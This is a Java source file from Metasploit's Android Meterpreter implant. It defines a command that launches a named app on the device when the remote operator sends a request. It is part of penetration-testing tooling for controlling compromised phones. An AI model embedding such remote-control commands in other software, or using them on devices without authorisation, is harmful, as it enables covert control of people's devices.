package com.metasploit.meterpreter.android;

import android.content.Context;

import android.content.Intent;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class appapi_app_run implements Command {

    private static final int TLV_EXTENSIONS                = 20000;
    private static final int TLV_TYPE_APP_PACKAGE_NAME     = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2913);
    private static final int TLV_TYPE_APP_RUN_ENUM         = TLVPacket.TLV_META_TYPE_UINT   | (TLV_EXTENSIONS + 2916);
    final Context context = AndroidMeterpreter.getContext();

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String packageName = request.getStringValue(TLV_TYPE_APP_PACKAGE_NAME);

        try {
            Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

        } catch (java.lang.RuntimeException ex) {
            response.addOverflow(TLV_TYPE_APP_RUN_ENUM, 2); // Not Found Package Name
            return ERROR_SUCCESS;
        }

        response.addOverflow(TLV_TYPE_APP_RUN_ENUM, 1); // Good
        return ERROR_SUCCESS;
    }
}
